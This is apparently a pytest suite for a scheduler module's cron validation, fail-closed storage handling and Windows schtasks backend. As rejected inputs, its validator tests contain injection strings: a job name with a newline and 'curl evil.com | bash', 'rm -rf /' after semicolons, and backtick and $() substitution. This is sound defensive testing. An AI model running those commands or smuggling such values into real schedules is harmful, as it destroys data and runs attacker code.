"""Tests for the Task Scheduler module."""

from unittest.mock import MagicMock, patch

import pytest

from radsim.cron_utils import escape_cron_percent
from radsim.scheduler import (
    Scheduler,
    sanitize_cron_command,
    validate_cron_schedule,
    validate_job_description,
    validate_job_name,
)


class TestValidateJobName:
    """Job names must be safe to place in a crontab marker comment."""

    def test_valid_name(self):
        assert validate_job_name("nightly-build") == "nightly-build"

    def test_strips_surrounding_space(self):
        assert validate_job_name("  build 2  ") == "build 2"

    def test_empty_raises(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_job_name("")

    def test_newline_raises(self):
        with pytest.raises(ValueError, match="Invalid job name"):
            validate_job_name("legit\n* * * * * curl evil.com | bash")

    def test_shell_metacharacter_raises(self):
        with pytest.raises(ValueError, match="Invalid job name"):
            validate_job_name("job; rm -rf /")


class TestValidateCronSchedule:
    """Test cron schedule validation."""

    def test_valid_schedule(self):
        assert validate_cron_schedule("0 9 * * *") is True

    def test_valid_every_minute(self):
        assert validate_cron_schedule("* * * * *") is True

    def test_valid_complex(self):
        assert validate_cron_schedule("0,30 9-17 * * 1-5") is True

    def test_valid_step(self):
        assert validate_cron_schedule("*/5 * * * *") is True

    def test_empty_raises(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_cron_schedule("")

    def test_whitespace_only_raises(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_cron_schedule("   ")

    def test_injection_semicolon_raises(self):
        with pytest.raises(ValueError, match="Invalid cron schedule"):
            validate_cron_schedule("0 9 * * *; rm -rf /")

    def test_injection_backtick_raises(self):
        with pytest.raises(ValueError, match="Invalid cron schedule"):
            validate_cron_schedule("0 9 * * `whoami`")

    def test_injection_dollar_raises(self):
        with pytest.raises(ValueError, match="Invalid cron schedule"):
            validate_cron_schedule("0 9 * * $(evil)")

    def test_wrong_field_count_raises(self):
        with pytest.raises(ValueError, match="5 fields"):
            validate_cron_schedule("0 9 *")

    def test_too_many_fields_raises(self):
        with pytest.raises(ValueError, match="5 fields"):
            validate_cron_schedule("0 9 * * * *")

    def test_trailing_newline_raises(self):
        with pytest.raises(ValueError, match="Invalid cron schedule"):
            validate_cron_schedule("0 9 * * *\n")

    def test_out_of_range_values_raise(self):
        with pytest.raises(ValueError, match="Invalid cron schedule values"):
            validate_cron_schedule("99 25 * * *")

    def test_non_string_schedule_raises_value_error(self):
        with pytest.raises(ValueError, match="must be a string"):
            validate_cron_schedule(123)


class TestSanitizeCronCommand:
    """Test command sanitization for cron."""

    def test_simple_command(self):
        result = sanitize_cron_command("echo hello")
        assert isinstance(result, str)
        assert len(result) > 0

    def test_preserves_safe_command(self):
        result = sanitize_cron_command("python3 script.py")
        assert "python3" in result
        assert "script.py" in result


class TestValidateJobDescription:
    def test_none_becomes_empty_description(self):
        assert validate_job_description(None) == ""

    def test_non_string_description_is_rejected(self):
        with pytest.raises(ValueError, match="must be a string"):
            validate_job_description(123)

    def test_terminal_control_description_is_rejected(self):
        with pytest.raises(ValueError, match="control characters"):
            validate_job_description("safe\x1b[2Khidden")


class TestSchedulerFailClosed:
    """Crontab uncertainty must never overwrite existing user state."""

    @patch("radsim.scheduler.subprocess.run")
    def test_read_failure_aborts_without_write(self, mock_run, tmp_path):
        mock_run.return_value = MagicMock(returncode=1, stdout="", stderr="permission denied")
        scheduler = Scheduler()
        scheduler.schedules_file = tmp_path / "schedules.json"
        scheduler.schedules = {"jobs": []}

        result = scheduler.add_job("safe", "0 9 * * *", "echo hello")

        assert result["success"] is False
        assert mock_run.call_count == 1
        assert scheduler.schedules["jobs"] == []

    @patch("radsim.scheduler.subprocess.run")
    def test_render_revalidates_persisted_job(self, mock_run):
        scheduler = Scheduler()
        tampered_job = {
            "name": "safe\n* * * * * injected",
            "schedule": "0 9 * * *",
            "command": "echo safe",
            "enabled": True,
        }

        with pytest.raises(ValueError, match="Invalid job name"):
            scheduler._install_cron(tampered_job)
        mock_run.assert_not_called()

    def test_percent_escaping_is_idempotent(self):
        assert escape_cron_percent("date +%F") == "date +\\%F"
        assert escape_cron_percent("date +\\%F") == "date +\\%F"

    def test_corrupt_storage_is_not_treated_as_empty(self, tmp_path):
        scheduler = Scheduler.__new__(Scheduler)
        scheduler.schedules_file = tmp_path / "schedules.json"
        scheduler.schedules_file.write_text('{"jobs": "not-a-list"}')

        with pytest.raises(ValueError, match="refusing to modify"):
            scheduler._load_schedules()

    def test_non_string_persisted_name_is_rejected(self, tmp_path):
        scheduler = Scheduler.__new__(Scheduler)
        scheduler.schedules_file = tmp_path / "schedules.json"
        scheduler.schedules_file.write_text(
            '{"jobs":[{"name":123,"schedule":"0 9 * * *",'
            '"command":"echo safe","enabled":true}]}'
        )

        with pytest.raises(ValueError, match="refusing to modify"):
            scheduler._load_schedules()

    def test_non_normalized_persisted_name_is_rejected(self, tmp_path):
        scheduler = Scheduler.__new__(Scheduler)
        scheduler.schedules_file = tmp_path / "schedules.json"
        scheduler.schedules_file.write_text(
            '{"jobs":[{"name":" safe ","schedule":"0 9 * * *",'
            '"command":"echo safe","enabled":true}]}'
        )

        with pytest.raises(ValueError, match="refusing to modify"):
            scheduler._load_schedules()

    def test_enable_save_failure_does_not_install(self):
        scheduler = Scheduler.__new__(Scheduler)
        scheduler.schedules = {"jobs": [{"name": "safe", "enabled": False}]}
        scheduler._save_schedules = MagicMock(return_value=False)
        scheduler._install_cron = MagicMock()

        result = scheduler.enable_job("safe", True)

        assert result["success"] is False
        assert scheduler.schedules["jobs"][0]["enabled"] is False
        scheduler._install_cron.assert_not_called()

    def test_add_save_failure_does_not_install(self):
        scheduler = Scheduler.__new__(Scheduler)
        scheduler.schedules = {"jobs": []}
        scheduler._save_schedules = MagicMock(return_value=False)
        scheduler._install_cron = MagicMock()

        result = scheduler.add_job("safe", "0 9 * * *", "echo safe")

        assert result["success"] is False
        assert scheduler.schedules["jobs"] == []
        scheduler._install_cron.assert_not_called()

    def test_add_install_failure_restores_storage(self, tmp_path):
        scheduler = Scheduler.__new__(Scheduler)
        scheduler.schedules_file = tmp_path / "schedules.json"
        scheduler.schedules = {"jobs": []}
        scheduler._install_cron = MagicMock(return_value=False)

        result = scheduler.add_job("safe", "0 9 * * *", "echo safe")

        assert result["success"] is False
        assert scheduler.schedules["jobs"] == []
        assert scheduler.schedules_file.read_text() == '{\n  "jobs": []\n}'

    def test_invalid_description_is_rejected_before_persistence(self, tmp_path):
        scheduler = Scheduler.__new__(Scheduler)
        scheduler.schedules_file = tmp_path / "schedules.json"
        scheduler.schedules = {"jobs": []}
        scheduler._install_cron = MagicMock(return_value=True)

        with pytest.raises(ValueError, match="must be a string"):
            scheduler.add_job("safe", "0 9 * * *", "echo safe", description=123)

        assert scheduler.schedules == {"jobs": []}
        assert not scheduler.schedules_file.exists()
        scheduler._install_cron.assert_not_called()

    def test_disable_save_failure_does_not_uninstall(self):
        scheduler = Scheduler.__new__(Scheduler)
        scheduler.schedules = {"jobs": [{"name": "safe", "enabled": True}]}
        scheduler._save_schedules = MagicMock(return_value=False)
        scheduler._uninstall_cron = MagicMock()

        result = scheduler.enable_job("safe", False)

        assert result["success"] is False
        assert scheduler.schedules["jobs"][0]["enabled"] is True
        scheduler._uninstall_cron.assert_not_called()

    def test_remove_save_failure_does_not_uninstall(self):
        scheduler = Scheduler.__new__(Scheduler)
        job = {"name": "safe", "enabled": True}
        scheduler.schedules = {"jobs": [job]}
        scheduler._save_schedules = MagicMock(return_value=False)
        scheduler._uninstall_cron = MagicMock()

        result = scheduler.remove_job("safe")

        assert result["success"] is False
        assert scheduler.schedules["jobs"] == [job]
        scheduler._uninstall_cron.assert_not_called()

    def test_enable_install_failure_restores_storage(self, tmp_path):
        scheduler = Scheduler.__new__(Scheduler)
        scheduler.schedules_file = tmp_path / "schedules.json"
        scheduler.schedules = {"jobs": [{"name": "safe", "enabled": False}]}
        scheduler._install_cron = MagicMock(return_value=False)

        result = scheduler.enable_job("safe", True)

        assert result["success"] is False
        assert scheduler.schedules["jobs"][0]["enabled"] is False
        assert '"enabled": false' in scheduler.schedules_file.read_text()

    def test_disable_uninstall_failure_restores_storage(self, tmp_path):
        scheduler = Scheduler.__new__(Scheduler)
        scheduler.schedules_file = tmp_path / "schedules.json"
        scheduler.schedules = {"jobs": [{"name": "safe", "enabled": True}]}
        scheduler._uninstall_cron = MagicMock(return_value=False)

        result = scheduler.enable_job("safe", False)

        assert result["success"] is False
        assert scheduler.schedules["jobs"][0]["enabled"] is True
        assert '"enabled": true' in scheduler.schedules_file.read_text()

    def test_remove_uninstall_failure_restores_storage(self, tmp_path):
        scheduler = Scheduler.__new__(Scheduler)
        scheduler.schedules_file = tmp_path / "schedules.json"
        job = {"name": "safe", "enabled": True}
        scheduler.schedules = {"jobs": [job]}
        scheduler._uninstall_cron = MagicMock(return_value=False)

        result = scheduler.remove_job("safe")

        assert result["success"] is False
        assert scheduler.schedules["jobs"] == [job]
        assert '"name": "safe"' in scheduler.schedules_file.read_text()


class TestWindowsSchedulerBackend:
    @patch("radsim.scheduler.subprocess.run")
    @patch("radsim.scheduler.is_windows", return_value=True)
    def test_install_uses_schtasks_not_crontab(self, _mock_system, mock_run):
        mock_run.return_value = MagicMock(returncode=0)
        scheduler = Scheduler.__new__(Scheduler)
        job = {
            "name": "daily-report",
            "schedule": "30 14 * * *",
            "command": 'Write-Output "safe"',
            "enabled": True,
        }

        assert scheduler._install_cron(job) is True

        arguments = mock_run.call_args.args[0]
        assert arguments[0] == "schtasks"
        assert arguments[1:5] == ["/create", "/tn", "RadSim_Schedule_daily-report", "/tr"]
        assert "powershell.exe" in arguments[5]
        assert "crontab" not in arguments

    @patch("radsim.scheduler.subprocess.run")
    @patch("radsim.scheduler.is_windows", return_value=True)
    def test_uninstall_deletes_exact_managed_task(self, _mock_system, mock_run):
        mock_run.return_value = MagicMock(returncode=0)
        scheduler = Scheduler.__new__(Scheduler)

        assert scheduler._uninstall_cron("daily-report") is True

        assert mock_run.call_args.args[0] == [
            "schtasks",
            "/delete",
            "/tn",
            "RadSim_Schedule_daily-report",
            "/f",
        ]

    @patch("radsim.scheduler.is_windows", return_value=True)
    def test_unsupported_windows_schedule_rolls_back_storage(self, _mock_system, tmp_path):
        scheduler = Scheduler.__new__(Scheduler)
        scheduler.schedules_file = tmp_path / "schedules.json"
        scheduler.schedules = {"jobs": []}

        result = scheduler.add_job("complex", "0,30 9-17 * * 1-5", "echo safe")

        assert result["success"] is False
        assert scheduler.schedules == {"jobs": []}
        assert '"jobs": []' in scheduler.schedules_file.read_text()
